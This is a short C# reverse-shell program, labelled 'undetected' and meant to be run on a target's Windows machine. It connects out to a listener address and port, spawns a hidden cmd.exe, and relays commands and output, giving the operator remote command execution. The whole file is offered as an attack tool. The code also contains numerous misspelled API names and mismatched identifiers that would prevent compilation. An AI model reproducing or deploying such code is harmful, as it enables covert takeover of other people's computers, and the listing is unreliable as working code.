// Created By benelhaj_younes (Do0pH2ck)
// Date: 2019/08/22
// Compile And Run On Target's Machine (Windows Machine)
// Undetected ReverseShell Made In C#
using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
using System.IO;
using System.ComponentModel;
using System.Linq;

namespace ConnectBack {
  public class Program {
    static StreamWriter streamWriter;
    public static void Main(string[] args) {
      using (TcpClient client = new TcpClient("127.0.0.1",911)) {
        using (Stream stream = client.GetStream())
        {
          using(StreamReader rdr = new StreamReader(stream)) {
            streamWriter = new StreamWriter(stream);

            StringBuilder strInput = new  StringBuilder();


            Process p = new Process();

            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.CreateNowWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.redirectStandarOutput = true;
            p.StartInfo.redirectStandarInput = true;
            p.StartInfo.redirectStandarError = true;
            p.OutputDataReceived += new OutputDataReceivedEvenHandler(CmdOutputDataHandler);
            p.Start();
            p.BeginOutputReadLine();

            while(true) {
              strInput.Append(rdr.ReadLine());
              p.StandarInput.WriteLine(strInput);
              strInput.Remove(0, strInput.Length);
            }
          }
        }
      }
    }
    public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEvenArgs outline) {
      StringBuilder strOuput = new StringBuilder();
      if (!String.IsNullOrEmpty(outLine.Data))
      {
        try {
          strOuput.Append(outLine.Data);
          streamWriter.WriteLine(strOuput);
          streamWriter.FLush();
        }
        catch (Exception err) { }
      }
    }
  }
}
